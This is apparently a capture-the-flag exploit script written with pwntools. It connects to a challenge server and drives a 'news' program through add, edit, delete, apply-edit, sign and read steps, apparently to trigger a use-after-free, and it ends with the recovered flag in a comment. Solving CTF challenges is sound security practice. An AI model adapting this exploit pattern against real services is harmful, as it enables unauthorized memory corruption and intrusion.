from pwn import *

exe = ELF("news")
context.binary = exe
HOST = "challenges.ctfd.io"
PORT = 30097
r = remote(HOST, PORT)


def init_index(option, index):
    print(r.recvuntil("> "))
    r.sendline(str(option))
    print(r.recvline())
    r.sendline(str(index))
    print(r.recvline())


def add_article(content):
    print(r.recvuntil("> "))
    r.sendline("1")
    print(r.recvline())
    r.send(content)
    print(r.recvline())


def add_edit_insert(index, offset, content):
    init_index(2, index)
    r.sendline("1")
    print(r.recvline())
    r.sendline(str(offset))
    print(r.recvline())
    r.sendline(content)
    print(r.recvline())


def apply_edit(index):
    init_index(3, index)


def sign_article(index):
    init_index(4, index)
    print(r.recvline())


def read_article(index):
    init_index(5, index)


def delete_article(index):
    print(r.recvuntil("> "))
    r.sendline("6")
    print(r.recvline())
    r.sendline(str(index))


add_article("A" * 140)
add_edit_insert(0, 0, "A")
delete_article(0)
apply_edit(0)
sign_article(0)
read_article(0)
r.interactive()

# FLAG --> batpwn{R3ad1ng_n3ws_l1kE_a_pR0}
